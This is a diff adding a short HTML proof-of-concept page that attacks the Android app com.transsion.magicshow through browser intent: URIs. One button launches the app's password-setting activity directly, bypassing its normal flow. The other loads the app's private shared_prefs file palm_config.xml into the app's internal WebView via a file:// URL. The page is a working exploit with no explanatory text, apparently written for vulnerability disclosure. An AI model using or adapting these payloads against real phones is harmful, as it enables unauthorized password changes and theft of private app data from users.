@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>poc</title>
+</head>
+<body>
+	<button onclick="setpasswd()">密码重置</button>
+	<button onclick="readfile()" >文件读取</button>
+	<script type="text/javascript">
+
+		function setpasswd() {
+			
+			location.replace("intent:#Intent;component=com.transsion.magicshow/com.transsion.tools.activities.PasswordSettingActivity;package=com.transsion.magicshow;action=android.intent.action.VIEW;end;")
+		}
+
+		function readfile() {
+			
+			location.replace("intent:#Intent;component=com.transsion.magicshow/com.transsion.playercommon.vishaweb.VishaWebViewActivity;package=com.transsion.magicshow;action=android.intent.action.VIEW;S.web_url=file:///data/data/com.transsion.magicshow/shared_prefs/palm_config.xml;end;")
+		}
+	
+	</script>
+</body>
+</html>
